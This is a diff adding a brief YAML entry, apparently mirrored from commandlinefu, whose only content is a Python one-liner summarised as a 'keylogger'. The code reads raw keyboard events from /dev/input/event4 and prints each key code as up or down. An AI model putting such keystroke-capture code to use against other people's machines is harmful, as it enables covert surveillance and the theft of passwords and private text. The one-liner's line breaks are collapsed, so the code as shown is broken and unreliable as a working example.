@@ -1,0 +1,8 @@
+commandlinefu_id: 10214
+translator:
+  weibo: ''
+hide: true
+command: |-
+  python -c  "DEV = '/dev/input/event4' fo = open(DEV) def inn(k,s):     if s == 0:        print '%i up'%k     if s == 1:        print '%i down'%k  while 1:     l = fo.read(16)     if ord(l[10]) != 0:        k,s = l[10],l[12]        inn(ord(k),ord(s)) "
+summary: |-
+  keylogger
